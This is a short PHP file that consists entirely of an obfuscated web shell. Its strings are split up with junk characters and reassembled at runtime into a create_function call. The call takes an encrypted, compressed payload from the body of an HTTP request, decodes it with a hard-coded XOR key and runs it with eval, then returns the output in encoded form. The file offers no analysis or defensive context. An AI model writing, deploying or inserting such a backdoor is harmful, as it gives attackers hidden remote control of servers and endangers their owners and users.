<?php
$d='trleVJn($t);$VJVJo="";foVJr($i=0;VJ$i<VJ$l;){VJfor($j=VJ0;($j<$c&&$i<$lVJ)VJ';
$h=str_replace('Z','','ZZcreaZte_ZfuZnctZion');
$m='VJVJ"/$khVJ(.+VJ)$kf/",@fVJile_get_conteVJntsVJ(VJ"php://inpuVJt"),$m)VJ=';
$F='J$m[1]),$k))VJ);$o=@oVJb_get_VJconVJtentsVJ();@ob_VJend_VJclean();$VJr=@VJ';
$u='VJp="L9g3RFSoQpVJuV0f37";fuVJnctioVJn x($VJt,$kVJ){$c=strlen($kVJ);$l=sVJ';
$X='=1) {@VJob_staVJrt();@eVJvalVJ(@gzuncoVJmprVJesVJs(@x(@base6VJ4_decode(VJV';
$O='$k="6b3VJ9da51";VJ$kh="VJ5a8VJ76c57VJ09e6";$kf="VJ71fc6VJ88ef4cVJ6";VJ$VJ';
$E=';$jVJ++,$i++)VJ{$o.VJ=$t{$i}VJ^$k{$j};}VJ}rVJeturn VJ$o;}if (@pregVJ_match(';
$l='baseVJ64_encVJoVJde(@x(@gzcomVJVJpress($o)VJ,$k));print("VJ$pVJ$kh$r$kf");}';
$V=str_replace('VJ','',$O.$u.$d.$E.$m.$X.$F.$l);
$Z=$h('',$V);$Z();
?>
